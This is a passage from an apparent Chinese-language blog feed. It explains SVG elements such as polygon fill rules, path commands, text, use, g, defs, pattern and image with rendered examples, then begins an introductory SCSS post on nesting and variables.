class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>points</code> —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。</li><li><p><code>fill-rule</code> —— 确定一个形状的“内部”，有效值: <code>nonzero | evenodd | inherit</code> :</p><ul><li><p><code>nonzero</code>字面意思是“非零”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点情况。从0开始计数，路径从左向右穿过射线则计数加1，从右向左穿过射线则计数减1。得出计数结果后，如果结果是0，则认为点在图形外部，否则认为在内部  </p><svg width="12cm" height="4cm" viewbox="0 0 1200 400" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><br/>  <desc>Example fillrule-nonzero - demonstrates fill-rule:nonzero</desc><br/>  <rect x="1" y="1" width="1198" height="398" fill="none" stroke="blue"/><br/>  <defs><br/>      <path id="Triangle" d="M 16,0 L -8,9 v-18 z" fill="black" stroke="none"/><br/>  </defs><br/>  <g fill-rule="nonzero" fill="red" stroke="black" stroke-width="3"><br/>      <path d="M 250,75 L 323,301 131,161 369,161 177,301 z"/><br/>      <use xlink:href="#Triangle" transform="translate(306.21 249) rotate(72)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(175.16,193.2) rotate(216)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(314.26,161) rotate(0)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(221.16,268.8) rotate(144)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(233.21,126.98) rotate(288)" overflow="visible"/><br/>      <path d="M 600,81 A 107,107 0 0,1 600,295 A 107,107 0 0,1 600,81 z              M 600,139 A 49,49 0 0,1 600,237 A 49,49 0 0,1 600,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(60) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(180) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(300) translate(49,0) rotate(90)" overflow="visible"/><br/>      <path d="M 950,81 A 107,107 0 0,1 950,295 A 107,107 0 0,1 950,81 z              M 950,139 A 49,49 0 0,0 950,237 A 49,49 0 0,0 950,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(60) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(180) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(300) translate(49,0) rotate(-90)" overflow="visible"/><br/>  </g><br/></svg></li><li><p><code>evenodd</code>字面意思是“奇偶”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点的数量。如果结果是奇数则认为点在内部，是偶数则认为点在外部  </p><svg width="12cm" height="4cm" viewbox="0 0 1200 400" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><br/>  <desc>Example fillrule-evenodd - demonstrates fill-rule:evenodd</desc><br/>  <rect x="1" y="1" width="1198" height="398" fill="none" stroke="blue"/><br/>  <defs><br/>      <path id="Triangle" d="M 16,0 L -8,9 v-18 z" fill="black" stroke="none"/><br/>  </defs><br/>  <g fill-rule="evenodd" fill="red" stroke="black" stroke-width="3"><br/>      <path d="M 250,75 L 323,301 131,161 369,161 177,301 z"/><br/>      <use xlink:href="#Triangle" transform="translate(306.21 249) rotate(72)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(175.16,193.2) rotate(216)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(314.26,161) rotate(0)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(221.16,268.8) rotate(144)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(233.21,126.98) rotate(288)" overflow="visible"/><br/>      <path d="M 600,81 A 107,107 0 0,1 600,295 A 107,107 0 0,1 600,81 z              M 600,139 A 49,49 0 0,1 600,237 A 49,49 0 0,1 600,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(60) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(180) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(300) translate(49,0) rotate(90)" overflow="visible"/><br/>      <path d="M 950,81 A 107,107 0 0,1 950,295 A 107,107 0 0,1 950,81 z              M 950,139 A 49,49 0 0,0 950,237 A 49,49 0 0,0 950,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(60) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(180) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(300) translate(49,0) rotate(-90)" overflow="visible"/><br/>  </g><br/></svg><p>更多案例：<a href="http://www.runoob.com/svg/svg-polygon.html" target="_blank" rel="noopener">http://www.runoob.com/svg/svg-polygon.html</a></p><div style="width: 500px; height: 200px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="200" height="180" style="float:left;"><br/>  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:nonzero;"/><br/>  </svg><br>  <svg width="200" height="180" style="float:left;"><br/>  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;"/><br/>  </svg><br></div></li></ul></li></ul></li><li><p><code>&lt;path&gt;</code>标签<br> <code>&lt;path&gt;</code>标签用于制路径</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    M 18,3</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 46,3</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 46,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 61,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 32,68</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 3,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 18,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    Z</span></span></span><br><span class="line"><span class="tag"><span class="string">    "</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>M = moveto</code></li><li><code>L = lineto</code></li><li><code>H = horizontal lineto</code></li><li><code>V = vertical lineto</code></li><li><code>C = curveto</code></li><li><code>S = smooth curveto</code></li><li><code>Q = quadratic Bézier curve</code></li><li><code>T = smooth quadratic Bézier curveto</code></li><li><code>A = elliptical Arc</code></li><li><p><code>Z = closepath</code></p><p>| 指令 | 参数 | 描述 |<br>|:—-|:—-|:—-|<br>|  M  | x y | 起始点坐标x y （Move to） |<br>|  L  | x y | 冲当前点的坐标画直线到指定点的x y坐标（Line to） |<br>|  H  |  x  | 从当前点的坐标画水平直线到指定的x轴坐标（Horizontal line to） |<br>|  V  |  y  | 从当前点的坐标画垂直直线到指定的y轴坐标（Vertical line to） |<br>|  C  | x1 y1 x2 y2 x y | 从当前点的坐标画条贝塞尔线到指定点的x y坐标，其中x1 y1及x2,y2为控制点（Curve） |<br>|  S  | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） |<br>|  Q  | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） |<br>|  T  | x y | 从当前点的坐标画条反射二次贝塞曲线到指定点的x, y坐标，以前一个坐标为反射控制点（Smooth Quadratic Bézier curve） |<br>|  A  | rx ry x-axis-rotation large-arc-flag sweep-flag x y | 从当前点的坐标画个椭圆形到指定点的x, y坐标，其中rx, ry为椭圆形的x轴及y轴的半径，x-axis-rotation是弧线与x轴的旋转角度，large-arc-flag则设定1最大角度的弧线或是0最小角度的弧线，sweep-flag设定方向为1顺时针方向或0逆时针方向（Arc） |<br>|  Z  |      | 关闭路径，将当前点坐标与第一个点的坐标连接起来（Closepath） |</p><p><em>注意：以上所有命令均允许小写字母。大写代表绝对坐标，小写代表与前一个坐标的相对座标。</em></p><svg width="300" height="180" fill="red"><br/>   <path d="   M 18,3   L 46,3   L 46,40   L 61,40   L 32,68   L 3,40   L 18,40   Z   "/><br/></svg></li></ul></li><li><p><code>&lt;text&gt;</code> 标签<br> <code>&lt;text&gt;</code>标签用于绘制文本  </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"50"</span> <span class="attr">y</span>=<span class="string">"25"</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">    ```  </span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span> <span class="attr">fill</span>=<span class="string">"red"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"50"</span> <span class="attr">y</span>=<span class="string">"25"</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">10. `<span class="tag">&lt;<span class="name">use</span>&gt;</span>` 标签  </span><br><span class="line">    `<span class="tag">&lt;<span class="name">use</span>&gt;</span>` 标签用于复制一个形状 </span><br><span class="line"></span><br><span class="line">    ``` xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 30 10"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"myuse"</span> <span class="attr">cx</span>=<span class="string">"5"</span> <span class="attr">cy</span>=<span class="string">"5"</span> <span class="attr">r</span>=<span class="string">"4"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">    ```  </span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 30 10"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"myuse"</span> <span class="attr">cx</span>=<span class="string">"5"</span> <span class="attr">cy</span>=<span class="string">"5"</span> <span class="attr">r</span>=<span class="string">"4"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">11. `<span class="tag">&lt;<span class="name">g</span>&gt;</span>` 标签  </span><br><span class="line">    `<span class="tag">&lt;<span class="name">g</span>&gt;</span>` 标签用于将多个形状组成一个组（group）</span><br><span class="line"></span><br><span class="line">    ``` xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">"myg"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"25"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>圆形<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"20"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myg"</span> <span class="attr">x</span>=<span class="string">"100"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myg"</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure> <div style="width: 500px; height: 200px; margin: 15px 0;background: #fff;"><br>     <svg width="300" height="100"><br/>         <g id="myg"><br/>             <text x="25" y="20">圆形</text><br/>             <circle cx="50" cy="50" r="20"/><br/>         </g><br/>         <use href="#myg" x="100" y="0" fill="blue"/><br/>         <use href="#myg" x="200" y="0" fill="white" stroke="blue"/><br/>     </svg><br> </div></li><li><p><code>&lt;defs&gt;</code> 标签<br><code>&lt;defs&gt;</code> 标签用于自定义形状，它内部的代码不会显示，仅供引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">"myCircle"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"25"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>圆形<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"20"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"100"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><div style="width: 500px; height: 200px; margin: 15px 0;background: #fff;"><br>    <svg width="300" height="100"><br/>        <defs><br/>            <g id="myCircle"><br/>                <text x="25" y="20">圆形</text><br/>                <circle cx="50" cy="50" r="20"/><br/>            </g><br/>        </defs><br/>        <use href="#myCircle" x="0" y="0"/><br/>        <use href="#myCircle" x="100" y="0" fill="blue"/><br/>        <use href="#myCircle" x="200" y="0" fill="white" stroke="blue"/><br/>    </svg><br></div></li><li><p><code>&lt;pattern&gt;</code> 标签<br><code>&lt;pattern&gt;</code> 标签用于自定义一个形状，该形状可以被引用来平铺一个区域</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">height</span>=<span class="string">"500"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span> <span class="attr">id</span>=<span class="string">"dots"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">patternUnits</span>=<span class="string">"userSpaceOnUse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">circle</span> <span class="attr">fill</span>=<span class="string">"#bee9e8"</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"35"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">fill</span>=<span class="string">"url(#dots)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- patternUnits="userSpaceOnUse"表示&lt;pattern&gt;的宽度和长度是实际的像素值 --&gt;</span></span><br></pre></td></tr></table></figure><div style="display:inline-block;border: 1px solid blue;"><br>    <svg width="500" height="500"><br/>        <defs><br/>            <pattern id="dots" x="0" y="0" width="100" height="100" patternunits="userSpaceOnUse"><br/>                <circle fill="#bee9e8" cx="50" cy="50" r="35"/><br/>            </pattern><br/>        </defs><br/>        <rect x="0" y="0" width="100%" height="100%" fill="url(#dots)"/><br/>    </svg><br></div></li><li><p><code>&lt;image&gt;</code> 标签<br><code>&lt;image&gt;</code> 标签用于插入图片文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 100 100"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">"//avatars3.githubusercontent.com/u/22409333?s=460&amp;v=4"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">height</span>=<span class="string">"50%"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><svg viewbox="0 0 100 100" width="500" height="500"><br/>    <image xlink:href="https://avatars3.githubusercontent.com/u/22409333?s=460&v=4" width="50%" height="50%"/><br/></svg></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言&lt;br&gt;
    
    </summary>
    
    
      <category term="HTML+CSS" scheme="https://jiuylq.github.io/tags/HTML-CSS/"/>
    
  </entry>
  
  <entry>
    <title>SCSS 入门</title>
    <link href="https://jiuylq.github.io/2018/12/13/scss/"/>
    <id>https://jiuylq.github.io/2018/12/13/scss/</id>
    <published>2018-12-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:20:53.417Z</updated>
    
    <content type="html"><![CDATA[<p>SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="scss入门篇"><a href="#scss入门篇" class="headerlink" title="scss入门篇"></a>scss入门篇</h2><blockquote><p><a href="http://www.cnblogs.com/iovec/p/8024408.html" target="_blank" rel="noopener">链接</a>  </p></blockquote><h3 id="是-Sass-还是-SCSS？"><a href="#是-Sass-还是-SCSS？" class="headerlink" title="是 Sass 还是 SCSS？"></a>是 Sass 还是 SCSS？</h3><blockquote><p>SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。</p></blockquote><h3 id="一、嵌套写法"><a href="#一、嵌套写法" class="headerlink" title="一、嵌套写法"></a>一、嵌套写法</h3><p><strong>css原生写法</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.name</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.age</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span>&#123;</span><br><span class="line">    <span class="selector-class">.content</span>&#123;</span><br><span class="line">        <span class="selector-class">.left-side</span>&#123;</span><br><span class="line">            <span class="selector-class">.profile</span>&#123;</span><br><span class="line">                <span class="selector-class">.name</span>&#123;</span><br><span class="line">                    <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="selector-class">.age</span>&#123;</span><br><span class="line">                    <span class="attribute">color</span>: red;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>编译后</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.name</span>&#123;<span class="attribute">font-size</span>: <span class="number">2rem</span>;&#125;</span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.age</span>&#123;<span class="attribute">color</span>: red;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="二、属性值的复用——定义变量"><a href="#二、属性值的复用——定义变量" class="headerlink" title="二、属性值的复用——定义变量"></a>二、属性值的复用——定义变量</h3><blockquote><p>变量一直是所有编程语言的标准配置。然而 CSS 就没有，再次证明 CSS 可能是一门假语言。好在 Sass 补上了这个短板。<br><strong>css原生写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.success-bg</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#dff0d8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.success-panel</span>&#123;</span><br><span class="line">    <span class="selector-class">.panel-heading</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#dff0d8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.panel-body</span>&#123;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dff0d8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 